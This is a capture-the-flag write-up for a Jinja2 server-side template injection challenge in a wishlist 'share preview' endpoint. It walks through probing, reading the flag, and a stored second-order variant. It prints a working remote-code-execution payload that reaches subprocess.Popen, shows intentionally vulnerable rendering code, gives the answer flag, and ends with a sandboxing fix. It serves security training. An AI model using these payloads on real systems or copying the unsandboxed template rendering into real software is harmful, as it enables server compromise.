# Wishlist SSTI Challenge

## Description

The LoopyMart wishlist feature includes a **"Share Preview"** option.  
Users supply a custom Jinja2 template that is **rendered server-side
without any sanitisation**, allowing Server-Side Template Injection (SSTI).

## Vulnerable Endpoint

```
POST /wishlist/{wishlist_id}/share-preview
Authorization: Bearer <jwt>
Content-Type: application/json

{ "share_template": "<your template here>" }
```

## Template Context

The server exposes these variables inside the template:

| Variable | Type | Description |
|---|---|---|
| `wishlist.name` | str | Name of the wishlist |
| `wishlist.items` | list | Products saved in the wishlist |
| `wishlist.item_count` | int | Number of items |
| `user.name` | str | Logged-in user's display name |
| `flag` | str | 🏁 **The CTF flag** |

## Setup (important)

The flag is read from `backend/flags.yml`.  Copy the example file before
starting the server:

```bash
cp backend/flags.example.yml backend/flags.yml
```

## Step-by-step Exploitation

### Step 1 – Verify injection works

Submit the following template:

```
{{ 7 * 7 }}
```

The response card should contain **49**.  
This confirms Jinja2 is evaluating your input server-side.

### Step 2 – Read the flag directly

```
{{ flag }}
```

The `flag` variable is injected into the template context by the server.
This is the intended solve path.

### Step 3 – Explore the Python object hierarchy (optional)

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Dumps all subclasses of `object`, useful for finding RCE gadgets.

### Step 4 – Remote Code Execution (advanced)

```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if c.__name__ == 'Popen' %}
{{ c(['id'], stdout=-1).communicate()[0].decode() }}
{% endif %}
{% endfor %}
```

Finds `subprocess.Popen` via the subclass chain and executes `id`.

## Second-Order (Stored) SSTI

There is a **second attack vector** in the same endpoint.

The wishlist **name** is also rendered through Jinja2 and appears in the
`<title>` tag of the share-preview response.

### Attack flow

```
1. Store a Jinja2 payload in the wishlist NAME:
   PATCH /wishlist/{id}
   { "name": "{{ flag }}" }

2. Trigger evaluation by requesting ANY share-preview for that wishlist:
   POST /wishlist/{id}/share-preview
   { "share_template": "hello" }

3. The rendered flag appears in the <title> of the response HTML:
   <title>CTF{t3mpl4t3_1nj3ct10n_ftw} – LoopyMart Wishlist</title>
```

This is a **second-order / stored SSTI**: the payload is persisted in the
database and silently executed later when a different code path reads the
name.

### Vulnerable code (server-side)

```python
# share_preview() in wishlist.py
rendered_name = jinja2.Template(doc["name"]).render(**template_context)
# … used in HTML:
# <title>{rendered_name} – LoopyMart Wishlist</title>
```

### Solve script

```bash
python solve.py --email your@email.com --password yourpassword --second-order
```

Output will show the payload stored, then each attack's `<title>` result and
card body for the `sanity`, `flag`, and `rce` payloads.

---

## Running the Solve Script (Direct / First-order SSTI)

```bash
cd solutions/wishlist-ssti

# install dependency (only requests needed)
pip install requests

# grab the flag  (simplest)
python solve.py --email your@email.com --password yourpassword

# sanity check – should print 49
python solve.py --email your@email.com --password yourpassword --payload sanity

# arbitrary custom template
python solve.py --email your@email.com --password yourpassword --custom "{{ 7*7 }}"

# run every built-in payload in order
python solve.py --email your@email.com --password yourpassword --all

# second-order / stored SSTI demo
python solve.py --email your@email.com --password yourpassword --second-order
```

## Flag

```
CTF{t3mpl4t3_1nj3ct10n_ftw}
```

## Root Cause

```python
# backend/app/api/wishlist.py  –  share_preview()
rendered = jinja2.Template(data.share_template).render(**template_context)
```

`data.share_template` is user-controlled and is passed **directly** to
`jinja2.Template()`, which executes arbitrary Jinja2 expressions including
Python attribute access and method calls.

## Mitigation

Use `SandboxedEnvironment` to block attribute traversal and dangerous calls:

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
rendered = env.from_string(data.share_template).render(**template_context)
```

Or — better — never pass the `flag` value into the template context at all,
and restrict templates to logic-less Mustache-style rendering.
